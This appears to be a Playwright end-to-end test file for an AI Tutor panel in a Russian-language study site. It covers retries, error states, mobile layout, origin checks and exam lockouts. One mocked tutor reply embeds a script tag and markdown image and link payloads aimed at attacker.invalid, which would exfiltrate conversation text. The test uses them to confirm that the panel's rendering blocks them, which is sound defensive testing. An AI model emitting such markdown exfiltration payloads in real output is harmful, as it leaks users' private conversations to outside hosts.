import { test as base, expect } from "@playwright/test";
import { loadEnvConfig } from "@next/env";
import { createHash, randomBytes, randomUUID } from "node:crypto";
import { db } from "../src/lib/db";
import type { TutorSnapshot } from "../src/lib/tutor/types";

loadEnvConfig(process.cwd(), true, { info() {}, error() {} });

// Real isolated accounts/authentication. Conversational responses are explicitly
// intercepted UI fixtures, not evidence of live model teaching quality.
const test = base.extend<{ learnerId: string }>({
  learnerId: async ({ context, baseURL }, runFixture) => {
    const user = await db.user.create({
      data: {
        telegramId: `test-tutor-${randomUUID()}`,
        firstName: "Tutor test",
        settings: { create: {} },
      },
    });
    try {
      const token = randomBytes(32).toString("hex");
      await db.authSession.create({
        data: {
          userId: user.id,
          tokenHash: createHash("sha256").update(token).digest("hex"),
          expiresAt: new Date(Date.now() + 600000),
        },
      });
      await context.addCookies([
        {
          name: "study_session",
          value: token,
          url: baseURL!,
          httpOnly: true,
          sameSite: "Lax",
        },
      ]);
      await runFixture(user.id);
    } finally {
      await db.user.delete({ where: { id: user.id } });
    }
  },
});
test.use({ trace: "off" });
test.afterAll(async () => db.$disconnect());

function emptySnapshot(): TutorSnapshot {
  return {
    context: {
      subjectTitle: "Архитектура компьютера",
      moduleTitle: "Представление данных",
      topicTitle: "Двоичная система",
      topicId: "binary",
      sectionTitle: "Что это?",
      restricted: false,
    },
    conversationId: null,
    messages: [],
    available: true,
  };
}

test("mocked Tutor conversation keeps section context, retry identity, safe rendering and refresh history", async ({
  page,
  learnerId,
}, testInfo) => {
  expect(learnerId).toBeTruthy();
  let saved = emptySnapshot();
  const externalRequests: string[] = [];
  page.on("request", (request) => {
    if (request.url().includes("attacker.invalid"))
      externalRequests.push(request.url());
  });
  const keys: string[] = [];
  let section: string | null = null;
  await page.route("**/api/tutor**", async (route) => {
    if (route.request().method() === "GET") {
      section = new URL(route.request().url()).searchParams.get("sectionIndex");
      return route.fulfill({ json: saved });
    }
    const body = route.request().postDataJSON();
    if (body.action === "reset") {
      saved = emptySnapshot();
      return route.fulfill({ json: saved });
    }
    keys.push(body.requestKey);
    expect(body.context).toEqual({ topicId: "binary", sectionIndex: 0 });
    if (keys.length === 1) return route.abort("failed");
    saved = {
      ...saved,
      conversationId: "fixture-conversation",
      messages: [
        {
          id: "user-1",
          requestKey: body.requestKey,
          role: "user",
          content: body.message,
          status: "complete",
          sources: [],
        },
        {
          id: "assistant-1",
          requestKey: body.requestKey,
          role: "assistant",
          content:
            "У каждого разряда свой вес. **Binary** использует степени двойки. Какой вес у второго разряда?\n\n<script>window.tutorUnsafe=true</script>\n\n![diagram][img]\n\n[img]: //attacker.invalid/pixel?conversation=private-text\n\n[external][url]\n\n[url]: //attacker.invalid/private",
          status: "complete",
          sources: [
            {
              id: "source-1",
              title: "Двоичная система",
              topicId: "binary",
              sectionTitle: "Что это?",
              sectionIndex: 0,
              url: "/topics/binary#section-0",
            },
          ],
        },
      ],
    };
    return route.fulfill({ json: saved });
  });
  await page.goto("/topics/binary");
  const trigger = page
    .locator("#section-0")
    .getByRole("button", { name: "Разобрать этот фрагмент" });
  await trigger.click();
  const dialog = page.getByRole("dialog", { name: "AI Tutor" });
  await expect(
    dialog.getByRole("button", { name: "Закрыть Tutor" }),
  ).toBeFocused();
  await expect(dialog.getByLabel("Контекст Tutor")).toContainText(
    "Двоичная система / Что это?",
  );
  expect(section).toBe("0");
  await page.keyboard.press("Shift+Tab");
  await expect(
    dialog.getByLabel("Твой вопрос или ход рассуждений"),
  ).toBeFocused();
  await page.keyboard.press("Tab");
  await expect(
    dialog.getByRole("button", { name: "Закрыть Tutor" }),
  ).toBeFocused();
  await dialog
    .getByRole("button", { name: "Объясни проще", exact: true })
    .click();
  await dialog.getByRole("button", { name: "Отправить", exact: true }).click();
  await expect(dialog.getByRole("alert")).toBeVisible();
  await dialog.getByRole("button", { name: "Повторить запрос" }).click();
  await expect(dialog.locator(".tutor-message-assistant")).toContainText(
    "Какой вес у второго разряда?",
  );
  expect(keys).toHaveLength(2);
  expect(keys[0]).toBe(keys[1]);
  await expect(
    dialog.getByRole("link", { name: "Двоичная система · Что это?" }),
  ).toHaveAttribute("href", "/topics/binary#section-0");
  expect(await page.evaluate(() => "tutorUnsafe" in window)).toBe(false);
  await expect(dialog.locator(".tutor-message-assistant img")).toHaveCount(0);
  await expect(dialog.locator(".tutor-message-assistant .prose a")).toHaveCount(
    0,
  );
  expect(externalRequests).toEqual([]);
  await dialog.screenshot({ path: testInfo.outputPath("tutor-desktop.png") });
  await page.keyboard.press("Escape");
  await expect(dialog).not.toBeVisible();
  await expect(trigger).toBeFocused();
  await page.reload();
  await trigger.click();
  await expect(dialog.locator(".tutor-message-assistant")).toContainText(
    "Какой вес у второго разряда?",
  );
  expect(keys).toHaveLength(2);
  page.once("dialog", (confirmation) => confirmation.accept());
  await dialog.getByRole("button", { name: "Очистить разговор" }).click();
  await expect(
    dialog.getByText("На каком шаге стало непонятно?"),
  ).toBeVisible();
});

test("mocked Tutor definitive rejection unlocks editing but ambiguous failures keep retry identity", async ({
  page,
  learnerId,
}) => {
  expect(learnerId).toBeTruthy();
  let status = 429;
  const keys: string[] = [];
  await page.route("**/api/tutor**", async (route) => {
    if (route.request().method() === "GET")
      return route.fulfill({ json: emptySnapshot() });
    keys.push(route.request().postDataJSON().requestKey);
    return route.fulfill({ status, json: { error: `Rejected ${status}` } });
  });
  await page.goto("/topics/binary");
  await page
    .getByRole("button", { name: "Спросить AI Tutor", exact: true })
    .click();
  const dialog = page.getByRole("dialog");
  const editor = dialog.getByLabel("Твой вопрос или ход рассуждений");
  for (const code of [429, 400, 401, 403, 404, 413]) {
    status = code;
    await editor.fill(`Вопрос после ${code}`);
    await dialog
      .getByRole("button", { name: "Отправить", exact: true })
      .click();
    await expect(dialog.getByRole("alert")).toContainText(`Rejected ${code}`);
    await expect(editor).toBeEnabled();
    await expect(editor).toHaveValue(`Вопрос после ${code}`);
    await expect(
      dialog.getByRole("button", { name: "Повторить запрос" }),
    ).toHaveCount(0);
  }
  expect(new Set(keys).size).toBe(keys.length);
  status = 503;
  await editor.fill("Неоднозначный результат");
  await dialog.getByRole("button", { name: "Отправить", exact: true }).click();
  await expect(dialog.getByRole("alert")).toContainText("Rejected 503");
  await expect(editor).toBeDisabled();
  status = 409;
  await dialog.getByRole("button", { name: "Повторить запрос" }).click();
  await expect(dialog.getByRole("alert")).toContainText("Rejected 409");
  await expect(editor).toBeDisabled();
  expect(keys.at(-1)).toBe(keys.at(-2));
});

test("mocked pending history recovers request after reload and drawer fits mobile", async ({
  page,
  learnerId,
}, testInfo) => {
  expect(learnerId).toBeTruthy();
  await page.setViewportSize({ width: 390, height: 844 });
  const key = randomUUID();
  const saved = emptySnapshot();
  saved.messages = [
    {
      id: "u",
      requestKey: key,
      role: "user",
      content: "Почему так?",
      status: "complete",
      sources: [],
    },
    {
      id: "a",
      requestKey: key,
      role: "assistant",
      content: "",
      status: "pending",
      sources: [],
    },
  ];
  await page.route("**/api/tutor**", async (route) => {
    if (route.request().method() === "POST") {
      expect(route.request().postDataJSON().requestKey).toBe(key);
      saved.messages[1] = {
        ...saved.messages[1],
        status: "complete",
        content: "Начнём с одного разряда.",
      };
    }
    await route.fulfill({ json: saved });
  });
  await page.goto("/topics/binary");
  await page
    .getByRole("button", { name: "Спросить AI Tutor", exact: true })
    .click();
  const dialog = page.getByRole("dialog");
  await expect(
    dialog.getByLabel("Твой вопрос или ход рассуждений"),
  ).toBeDisabled();
  await dialog
    .getByRole("button", { name: "Проверить незавершённый запрос" })
    .click();
  await expect(dialog.getByText("Начнём с одного разряда.")).toBeVisible();
  await expect(
    dialog.getByLabel("Твой вопрос или ход рассуждений"),
  ).toBeEnabled();
  const box = await dialog.boundingBox();
  expect(box!.width).toBeLessThanOrEqual(390);
  expect(
    await dialog.evaluate(
      (element) => element.scrollWidth <= element.clientWidth,
    ),
  ).toBe(true);
  await dialog
    .getByLabel("Твой вопрос или ход рассуждений")
    .fill("Мой следующий шаг");
  await expect(
    dialog.getByRole("button", { name: "Отправить", exact: true }),
  ).toBeInViewport();
  await dialog.screenshot({ path: testInfo.outputPath("tutor-mobile.png") });
  await page.setViewportSize({ width: 320, height: 568 });
  expect(
    await dialog.evaluate(
      (element) => element.scrollWidth <= element.clientWidth,
    ),
  ).toBe(true);
  await dialog.getByRole("button", { name: "Отправить", exact: true }).focus();
  await expect(
    dialog.getByRole("button", { name: "Отправить", exact: true }),
  ).toBeInViewport();
});

test("real Tutor route rejects anonymous history", async ({ request }) => {
  const response = await request.get("/api/tutor?topicId=binary");
  expect(response.status()).toBe(401);
});

test("real Tutor route rejects cross-origin access and invalid input", async ({
  page,
  learnerId,
  baseURL,
}) => {
  expect(learnerId).toBeTruthy();
  const request = page.request;
  const message = {
    context: { topicId: "binary" },
    message: "Объясни разряд",
    requestKey: randomUUID(),
  };
  expect(
    (
      await request.get("/api/tutor?topicId=binary", {
        headers: { Origin: "https://foreign.example" },
      })
    ).status(),
  ).toBe(403);
  expect(
    (
      await request.post("/api/tutor", {
        headers: { Origin: "https://foreign.example" },
        data: message,
      })
    ).status(),
  ).toBe(403);
  expect(
    (await request.get("/api/tutor?topicId=binary&sectionIndex=-1")).status(),
  ).toBe(400);
  expect(
    (await request.get("/api/tutor?topicId=binary&topicId=lines")).status(),
  ).toBe(400);
  expect(
    (
      await request.post("/api/tutor", {
        headers: { Origin: baseURL! },
        data: { ...message, message: "x".repeat(2001) },
      })
    ).status(),
  ).toBe(400);
  expect(
    (
      await request.post("/api/tutor", {
        headers: { Origin: baseURL! },
        data: { ...message, message: "x".repeat(17000) },
      })
    ).status(),
  ).toBe(413);
  expect(
    await db.tutorConversation.count({ where: { userId: learnerId } }),
  ).toBe(0);
});

test("real unconfigured Tutor shows useful unavailable state", async ({
  page,
  learnerId,
}) => {
  expect(learnerId).toBeTruthy();
  test.skip(
    Boolean(process.env.OPENAI_API_KEY && process.env.TUTOR_MODEL),
    "Only tests real missing provider configuration; never invokes a live model.",
  );
  await page.goto("/topics/binary");
  await page
    .getByRole("button", { name: "Спросить AI Tutor", exact: true })
    .click();
  const dialog = page.getByRole("dialog");
  await expect(dialog.locator(".tutor-notice")).toContainText(
    /недоступ|настро|подключ/i,
  );
  await expect(
    dialog.getByRole("button", { name: "Отправить", exact: true }),
  ).toBeDisabled();
  await expect(dialog.getByRole("alert")).toHaveCount(0);
});

for (const protection of ["exam", "delayed", "no-hints"] as const) {
  test(`real active ${protection} disables exercise Tutor and blocks topic history`, async ({
    page,
    learnerId,
  }) => {
    const question = await db.question.findFirstOrThrow({
      where: { topicId: "binary" },
    });
    const session = await db.practiceSession.create({
      data: {
        userId: learnerId,
        mode: protection === "exam" ? "exam" : "custom",
        config: {
          topicIds: ["binary"],
          difficulties: [question.difficulty],
          questionTypes: [question.type],
          count: 1,
          feedbackMode: protection === "delayed" ? "end" : "immediate",
          hintsAllowed: protection !== "no-hints",
          overallBefore: null,
        },
        items: { create: { questionId: question.id, position: 0 } },
      },
    });
    await page.goto(`/practice/${session.id}`);
    await expect(
      page.getByRole("button", { name: "Обсудить задание с Tutor" }),
    ).toBeDisabled();
    await expect(page.locator(".tutor-disabled")).toContainText(
      "после завершения практики",
    );
    await page.goto("/topics/binary");
    await page
      .getByRole("button", { name: "Спросить AI Tutor", exact: true })
      .click();
    const dialog = page.getByRole("dialog");
    await expect(
      dialog.getByRole("button", { name: "Отправить", exact: true }),
    ).toBeDisabled();
    await expect(dialog.locator('.tutor-notice[role="status"]')).toContainText(
      /экзамен|практик|заверш/i,
    );
    await expect(
      dialog.getByRole("link", { name: "Продолжить сессию" }),
    ).toHaveAttribute("href", `/practice/${session.id}`);
    await expect(
      dialog.getByRole("link", { name: "Управлять незавершёнными сессиями" }),
    ).toHaveAttribute("href", "/practice#unfinished-sessions");
  });
}
